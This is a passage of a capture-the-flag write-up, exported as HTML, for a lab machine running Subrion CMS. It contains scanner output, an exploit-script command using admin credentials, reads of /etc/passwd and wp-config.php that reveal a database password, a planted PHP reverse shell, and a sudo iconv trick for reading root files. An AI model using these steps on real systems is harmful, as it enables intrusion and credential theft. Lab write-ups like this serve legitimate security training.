agent to render the content of the site in a different fashion to the MIME type. See: <a href="https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/">https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</a></li></ul><ul id="65c57c59-e04d-4ef9-a6d0-5aa9cb46436e" class="bulleted-list"><li style="list-style-type:disc">/subrion/: Cookie INTELLI_06c8042c3d created without the httponly flag. See: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</a></li></ul><ul id="b3287ec7-01df-4c1a-81ed-54be102f057d" class="bulleted-list"><li style="list-style-type:disc">Root page /subrion redirects to: <a href="http://10.0.2.15/subrion/subrion/">http://10.0.2.15/subrion/subrion/</a></li></ul><ul id="1d36ff0d-2316-40c5-a88f-673d7abc0437" class="bulleted-list"><li style="list-style-type:disc">All CGI directories &#x27;found&#x27;, use &#x27;-C none&#x27; to test none</li></ul><ul id="c3fb65b6-3e3e-4710-86e5-1e84ca8931ef" class="bulleted-list"><li style="list-style-type:disc">/robots.txt: Entry &#x27;/install/&#x27; is returned a non-forbidden or redirect HTTP code (200). See: <a href="https://portswigger.net/kb/issues/00600600_robots-txt-file">https://portswigger.net/kb/issues/00600600_robots-txt-file</a></li></ul><ul id="6b62d119-4202-44c5-9a70-b8abc11b1cb5" class="bulleted-list"><li style="list-style-type:disc">/robots.txt: Entry &#x27;/panel/&#x27; is returned a non-forbidden or redirect HTTP code (200). See: <a href="https://portswigger.net/kb/issues/00600600_robots-txt-file">https://portswigger.net/kb/issues/00600600_robots-txt-file</a></li></ul><ul id="7de7522c-756c-4e2f-a219-a7cbd4e90d94" class="bulleted-list"><li style="list-style-type:disc">/robots.txt: contains 7 entries which should be manually viewed. See: <a href="https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt">https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt</a></li></ul><ul id="329de28e-a842-4f89-b815-43a964188710" class="bulleted-list"><li style="list-style-type:disc">/: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is &quot;10.0.2.15&quot;. See: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649</a></li></ul><ul id="521a455d-7427-4830-ac7e-3004f027f560" class="bulleted-list"><li style="list-style-type:disc">Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</li></ul><ul id="101febf3-a4ed-4556-aeb2-34672ee1e377" class="bulleted-list"><li style="list-style-type:disc">OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .</li></ul><ul id="41302803-7983-422a-bdc0-c81d4113891a" class="bulleted-list"><li style="list-style-type:disc">/subrion/sitemap.xml: This gives a nice listing of the site content.</li></ul><ul id="c2396488-2e09-48b1-952d-2ae4070110ed" class="bulleted-list"><li style="list-style-type:disc">/subrion/cgi-win/gbook/gbook.cgi?_MAILTO=xx;ls: gbook.cgi allows command execution. See: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1131">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1131</a></li></ul><pre id="675a74be-cc9f-42b8-b950-039a68d0b239" class="code"><code>+ RFC-1918 /subrion/: IP address found in the &#x27;location&#x27; header. The IP is &quot;10.0.2.15&quot;. See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
++ /subrion/: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /subrion/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /subrion/: Cookie INTELLI_06c8042c3d created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ Root page /subrion redirects to: http://10.0.2.15/subrion/subrion/
++ All CGI directories &#x27;found&#x27;, use &#x27;-C none&#x27; to test none
++ /robots.txt: Entry &#x27;/install/&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#x27;/panel/&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: contains 7 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
++ /: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is &quot;10.0.2.15&quot;. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .
++ /subrion/sitemap.xml: This gives a nice listing of the site content.
++ /subrion/cgi-win/gbook/gbook.cgi?_MAILTO=xx;ls: gbook.cgi allows command execution. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1131</code></pre><p id="69914fcb-8b03-4ec1-971a-db25c980b8b2" class="">
+</p><p id="8729d240-69e5-4ebe-8128-771681f91377" class="">Subrion version 4.2.1 installed. Cheers!</p><p id="5186ee24-a342-4777-a798-df0e792d5f60" class="">
+</p><p id="17d1a3a4-9f50-4885-a2aa-a24a89c1357f" class="">python3 <a href="http://49876.py/">49876.py</a> -u <a href="http://10.10.192.183/subrion/panel/">http://10.10.192.183/subrion/panel/</a> -l admin -p Scam2021</p><p id="1a0d3ffc-f5f8-40db-b9fe-8a19443070ea" class="">
+</p><p id="68e66c03-6436-44a9-8862-be6ac6d40f12" class="">cat /etc/passwd</p><pre id="145285ca-ca6a-426d-8746-654fb9f53f5d" class="code"><code>scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash</code></pre><p id="64f8cc1e-eff7-4491-bae5-e18f6176624f" class="">We tried bruteforcing scamsite with hydra but no luck.</p><p id="8b25c376-7ba0-41e6-a5e1-5ad59d75209e" class="">
+</p><p id="51707abc-9c99-4b42-af0e-8e477151874c" class="">cat ../../wordpress/wp-config.php</p><pre id="84534497-5984-4de9-a20b-016afa1ba1ac" class="code"><code>/** MySQL database username */
+define( &#x27;DB_USER&#x27;, &#x27;support&#x27; );
+
+/** MySQL database password */
+define( &#x27;DB_PASSWORD&#x27;, &#x27;ImAScammerLOL!123!&#x27; );</code></pre><p id="98425eed-dab4-42bb-9825-6500d8a25443" class="">/** MySQL database username */
+define( &#x27;DB_USER&#x27;, &#x27;support&#x27; );</p><p id="b6a2dd98-1a7d-43b8-bc21-ab33073772ce" class="">/** MySQL database password */
+define( &#x27;DB_PASSWORD&#x27;, &#x27;ImAScammerLOL!123!&#x27; );</p><p id="f5e35247-06fc-41d2-af60-a0c1ca6392cd" class="">
+</p><p id="20381df5-7374-42b6-8a07-d29aa6e310aa" class="">Check if SQL is up (RABBIT HOLE)</p><pre id="32654615-8112-403b-b427-0ba3849c9242" class="code"><code>$ netstat -tunlp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::139                  :::*                    LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 :::445                  :::*                    LISTEN      -               
+udp        0      0 0.0.0.0:44304           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -</code></pre><p id="07129152-6b1f-4472-bc23-69498e8e0b38" class="">
+</p><p id="fbab2093-830f-4b3c-b50b-9b330b3591da" class="">In subrion <code>content/uploads</code> We can modify one of the uploaded files into a php reverse shell. We can then visit <code><a href="http://10.10.192.183/subrion/uploads/rev.phar">http://10.10.192.183/subrion/uploads/rev.phar</a></code> to run the shell</p><p id="5fa21226-666d-4f33-89b2-ccdf95e88c16" class="">we can switch user to scamsite using the password we found from wp-config.php</p><p id="563dcc6f-5b74-4907-a20a-ffb7fb5472a9" class="">
+</p><pre id="696e4a1c-cd25-4807-b53f-90cdfe917439" class="code"><code>scamsite@TechSupport:/$ LFILE=/root/root.txt
+scamsite@TechSupport:/$ sudo iconv -f 8859_1 -t 8859_1 &quot;$LFILE&quot;</code></pre><p id="197d2ef0-ebbd-449b-bea4-8707495b9bde" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
